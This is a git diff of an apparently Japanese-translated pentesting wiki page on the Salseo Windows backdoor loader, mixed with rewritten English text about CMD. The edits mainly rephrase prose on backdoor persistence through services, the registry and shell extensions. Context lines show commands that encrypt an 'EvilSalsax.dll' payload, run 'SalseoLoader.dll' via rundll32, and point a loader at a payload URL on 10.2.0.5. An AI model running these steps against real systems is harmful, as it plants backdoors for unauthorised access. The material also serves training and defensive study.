@@ -47,17 +47,17 @@ Windows（ウィンドウズ）は、最も一般的なオペレーティング�
 
 #### サービス
 
-Windowsでは、バックドアを作成するためにサービスを利用することができます。攻撃者は、システムにバックドアをインストールするために、既存のサービスを悪用することができます。また、攻撃者は、新しいサービスを作成してバックドアを実装することもできます。
+Windowsでは、バックドアを作成するためにサービスを利用することができます。攻撃者は、システムに悪意のあるサービスをインストールし、バックドアを作成することができます。この方法は、システムが起動するたびにバックドアが自動的に実行されるため、攻撃者にとって非常に便利です。
 
 #### レジストリ
 
-Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを悪用してバックドアを作成することができます。レジストリを変更することで、システムの動作を変更し、バックドアを実装することができます。
+Windowsのレジストリは、システムの設定情報を格納するデータベースです。攻撃者は、レジストリを悪用してバックドアを作成することができます。レジストリを変更することで、システムが起動するたびにバックドアが実行されるようにすることができます。
 
 #### シェル拡張
 
-Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラーの機能を拡張するためのプラグインです。攻撃者は、シェル拡張を悪用してバックドアを実装することができます。
+Windowsでは、シェル拡張を使用してバックドアを作成することもできます。シェル拡張は、エクスプローラーの右クリックメニューに追加される機能です。攻撃者は、シェル拡張を使用してバックドアを作成し、ユーザーが特定のファイルやフォルダを右クリックするとバックドアが実行されるようにすることができます。
 
-これらは、Windowsでバックドアを作成するための一般的な方法のいくつかです。攻撃者は、これらの方法を使用してシステムに不正アクセスし、機密情報を盗むなどの悪意のある活動を行うことができます。
+これらはWindowsでバックドアを作成するための一部の一般的な方法です。攻撃者は、これらの方法を悪用してシステムに不正アクセスすることができます。システムのセキュリティを強化するためには、これらの攻撃方法に対する対策を講じる必要があります。
 ```
 EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
 EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
@@ -111,19 +111,19 @@ Visual Studioを使用してSalseoLoaderプロジェクトを開きます。
 
 ### メイン関数の前に\[DllExport]を追加します
 
-![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 ### このプロジェクトにDllExportをインストールします
 
 #### **ツール** --> **NuGetパッケージマネージャー** --> **ソリューションのNuGetパッケージを管理...**
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 #### **DllExportパッケージを検索します（ブラウズタブを使用）し、インストールを押します（ポップアップを受け入れます）**
 
-![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)
 
-プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます
+プロジェクトフォルダには、**DllExport.bat**と**DllExport\_Configure.bat**のファイルが表示されます。
 
 ### DllExportをアンインストールします
 
@@ -184,23 +184,13 @@ rundll32.exe SalseoLoader.dll,main
 ```
 ### CMD
 
-CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It allows users to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, and managing files and processes.
+CMD (Command Prompt) is a command-line interpreter in Windows operating systems. It provides a way to interact with the operating system by executing commands. CMD can be used to perform various tasks, such as navigating through directories, running programs, managing files and folders, and configuring system settings.
 
-CMD provides a wide range of commands that can be used to carry out different operations. Some commonly used commands include:
+CMD is a powerful tool for hackers as it allows them to execute commands and scripts to exploit vulnerabilities, gain unauthorized access, and perform various malicious activities on a target system. It provides a direct interface to the underlying operating system, giving hackers control over the system's resources and functionalities.
 
-- `cd`: Change directory
-- `dir`: List files and directories
-- `mkdir`: Create a new directory
-- `del`: Delete files
-- `copy`: Copy files
-- `move`: Move files
-- `ren`: Rename files
-- `tasklist`: List running processes
-- `taskkill`: Terminate a running process
+Hackers can use CMD to execute commands to gather information about the target system, such as network configuration, running processes, and user accounts. They can also use CMD to launch attacks, such as brute-forcing passwords, injecting malicious code, and creating backdoors for persistent access.
 
-CMD can also be used to execute batch scripts, which are a series of commands stored in a text file with the extension `.bat` or `.cmd`. Batch scripts allow users to automate repetitive tasks by running multiple commands sequentially.
-
-Overall, CMD is a powerful tool for managing and controlling the Windows operating system through the command line interface.
+It is important for system administrators and users to be aware of the potential risks associated with CMD and take necessary precautions to secure their systems. Regularly updating the operating system, using strong passwords, and implementing security measures can help mitigate the risks associated with CMD-based attacks.
 ```
 set pass=password
 set payload=http://10.2.0.5/evilsalsax64.dll.txt
